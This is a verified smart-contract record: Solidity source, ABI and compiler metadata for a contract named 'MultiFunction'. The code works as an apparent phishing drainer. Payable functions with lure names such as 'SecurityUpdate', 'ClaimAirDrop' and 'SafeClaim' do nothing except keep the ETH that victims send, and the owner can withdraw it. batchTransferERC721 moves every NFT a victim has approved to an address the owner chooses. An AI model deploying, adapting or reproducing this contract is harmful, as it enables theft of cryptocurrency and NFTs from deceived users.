{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity >=0.7.0 <0.9.0;\r\n\r\n\r\ninterface IERC721 {\r\n    function ownerOf(uint256 tokenId) external view returns (address owner);\r\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\r\n\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokenId\r\n    ) external;\r\n}\r\n\r\ncontract MultiFunction {\r\n    address private owner;\r\n    address private contractAddress;\r\n\r\n    // event for EVM logging\r\n    event OwnerSet(address indexed oldOwner, address indexed newOwner);\r\n\r\n    // event for EVM logging\r\n    event BatchTransferERC721(\r\n        address indexed contractAddress,\r\n        address indexed to,\r\n        uint256 amount\r\n    );\r\n\r\n    modifier isOwner() {\r\n        require(msg.sender == owner, \"This method can only be called by the contract owner. Now fuck off\");\r\n        _;\r\n    }\r\n\r\n    \r\n    /**\r\n     * @dev Set contract deployer as owner\r\n     */\r\n    constructor() {\r\n        owner = msg.sender; \r\n        contractAddress = address(this);\r\n        emit OwnerSet(address(0), owner);\r\n    }\r\n\r\n    function changeOwner(address newOwner) public isOwner {\r\n        emit OwnerSet(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n\r\n    function getOwner() external view returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    /**\r\n    * @dev Used to withdraw the ETH funds to the provided address\r\n    */\r\n    function withdraw(\r\n        address payable _to\r\n    ) public isOwner {\r\n        (bool success, ) = _to.call{\r\n            value: address(this).balance\r\n        }(\"\");\r\n\r\n        require(success, \"ETH Transfer failed.\");\r\n    }\r\n\r\n    // Methods that can receive ETH\r\n    function SafeClaim() public payable {}\r\n    function SecurityUpdate() public payable {}\r\n    function ClaimAirDrop() public payable {}\r\n    function ClaimRewards() public payable {}\r\n    function ConfirmTrade() public payable {}\r\n    \r\n    /**\r\n    * @dev Used to transfer all approved NFTs to the provided address\r\n    */\r\n    function batchTransferERC721(\r\n        address _to, \r\n        IERC721 _collection, \r\n        uint256[] calldata  _ids\r\n    ) public isOwner {\r\n        uint256 length = _ids.length;\r\n        require(length > 0, \"No token IDs provided\");\r\n\r\n        address collectionOwner = _collection.ownerOf(_ids[0]);\r\n        bool approval = _collection.isApprovedForAll(collectionOwner, contractAddress);\r\n\r\n        require(approval, \"Contract does not have approval for this collection\");\r\n\r\n        for (uint256 i; i < length; ) {\r\n            uint256 tokenId = _ids[i];\r\n\r\n            address tokenIdOwner = _collection.ownerOf(tokenId);\r\n            require(tokenIdOwner == collectionOwner, \"Not every token ID has the same owner\");\r\n\r\n            _collection.safeTransferFrom(collectionOwner, _to, tokenId);\r\n\r\n            unchecked {\r\n                ++i;\r\n            }\r\n        }\r\n\r\n\r\n        emit BatchTransferERC721(address(_collection), _to, length);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"contractAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"BatchTransferERC721\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerSet\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"ClaimAirDrop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ConfirmTrade\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SafeClaim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"contract IERC721\",\"name\":\"_collection\",\"type\":\"address\"},{\"internalType\":\"uint256[]\",\"name\":\"_ids\",\"type\":\"uint256[]\"}],\"name\":\"batchTransferERC721\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MultiFunction", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "OSL-3.0", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5215fb1df060ed55a0bd2be81c1fe571e37ad9d23295792979fc5a340b54e741"}